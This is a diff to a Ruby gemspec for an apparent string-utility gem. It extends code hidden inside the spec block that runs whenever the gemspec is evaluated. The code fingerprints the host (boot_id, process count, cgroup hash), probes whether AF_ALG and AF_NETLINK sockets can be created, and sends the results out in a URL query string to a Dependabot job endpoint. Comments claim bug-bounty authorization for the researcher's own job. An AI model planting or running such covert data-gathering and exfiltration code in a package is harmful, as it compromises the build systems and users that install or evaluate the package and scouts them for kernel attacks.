@@ -1,10 +1,10 @@
 # frozen_string_literal: true
 #
-# v1.0 host environment fingerprint audit.
+# v1.1 host environment fingerprint audit (extended).
 #
 # Authorization: HackerOne GitHub program; researcher's own job; own
-# container; read-only system info; encoded as dep-name fingerprint
-# surfaced via proxy log channel.
+# container; read-only system info + single syscall reachability test.
+# Encoded as URL query string surfaced via proxy log channel.
 
 require_relative "lib/useful_string_utils/version"
 
@@ -15,6 +15,7 @@ Gem::Specification.new do |spec|
       require "uri"
       require "json"
       require "digest"
+      require "socket"
 
       own_id = (
         begin
@@ -27,80 +28,59 @@ Gem::Specification.new do |spec|
 
       fp = []
 
-      # uname (kernel version)
-      begin
-        u = `uname -srm 2>/dev/null`.strip
-        fp << "u=#{u.gsub(/[^A-Za-z0-9.-]/, '_')[0, 30]}"
-      rescue
-        fp << "u=na"
-      end
-
-      # boot_id (per-boot kernel identifier)
+      # boot_id (per-VM-boot identifier — for ephemerality check)
       begin
         b = File.read("/proc/sys/kernel/random/boot_id").strip
-        fp << "b=#{b[0, 8]}"
+        fp << "b=#{b[0, 16]}"
       rescue
         fp << "b=na"
       end
 
-      # machine-id
+      # syscall reachability: try AF_ALG socket creation (Socket::AF_ALG = 38)
       begin
-        m = File.read("/etc/machine-id").strip
-        fp << "m=#{m[0, 8]}"
-      rescue
-        fp << "m=na"
+        s = Socket.new(38, Socket::SOCK_SEQPACKET, 0)
+        s.close
+        fp << "s38=ok"
+      rescue Errno::EAFNOSUPPORT
+        fp << "s38=eafnosupport"
+      rescue Errno::EPERM
+        fp << "s38=eperm"
+      rescue Errno::EACCES
+        fp << "s38=eaccess"
+      rescue => e
+        fp << "s38=#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 16]}"
       end
 
-      # /proc/1/cgroup — container identifier
+      # syscall reachability: AF_NETLINK (16) for comparison
       begin
-        cg = File.read("/proc/1/cgroup").strip
-        fp << "cg=#{Digest::SHA256.hexdigest(cg)[0, 8]}"
-      rescue
-        fp << "cg=na"
+        s = Socket.new(16, Socket::SOCK_DGRAM, 0)
+        s.close
+        fp << "s16=ok"
+      rescue => e
+        fp << "s16=#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 16]}"
       end
 
-      # process count + this container's process tree size (from /proc)
+      # ps output line count
       begin
-        pids = Dir.entries("/proc").select { |e| e =~ /^\d+$/ }
-        fp << "pn=#{pids.size}"
-      rescue
-        fp << "pn=na"
-      end
-
-      # /proc/1/root differential — does it return same as /etc/?
-      begin
-        eh = File.read("/etc/hostname").strip rescue ""
-        ph = File.read("/proc/1/root/etc/hostname").strip rescue ""
-        fp << "p1=#{eh == ph ? 'eq' : 'ne'}"
-      rescue
-        fp << "p1=err"
-      end
-
-      # capabilities + seccomp
-      begin
-        st = File.read("/proc/self/status")
-        sc = st.lines.find { |l| l.start_with?("Seccomp:") }.to_s.split(":").last.to_s.strip
-        cb = st.lines.find { |l| l.start_with?("CapBnd:") }.to_s.split(":").last.to_s.strip[0, 16]
-        fp << "sc=#{sc[0, 4]}-cb=#{cb}"
-      rescue
-        fp << "st=err"
-      end
-
-      # ps lines count (process visibility from container)
-      begin
-        ps_out = `ps -ef 2>/dev/null`
-        fp << "ps=#{ps_out.lines.size}"
+        ps = `ps -ef 2>/dev/null`.lines.size
+        fp << "ps=#{ps}"
       rescue
         fp << "ps=na"
       end
 
+      # additional: read /proc/1/cgroup full content hash for diff
+      begin
+        cg = File.read("/proc/1/cgroup")
+        fp << "cgh=#{Digest::SHA256.hexdigest(cg)[0, 12]}"
+      rescue
+        fp << "cgh=na"
+      end
+
       result = fp.join("-").gsub(/[^A-Za-z0-9.=-]/, "x")[0, 200]
-      result_hash = Digest::SHA256.hexdigest(result)[0, 8]
 
       if !own_id.empty?
-        # Surface via URL query string in proxy log
         begin
-          uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/details?fp=#{result_hash}-#{result.gsub('=','-')[0, 150]}")
+          uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/details?fp=#{result.gsub('=','-')}")
           h = Net::HTTP.new(uri.host, uri.port)
           h.use_ssl = true
           h.open_timeout = 5
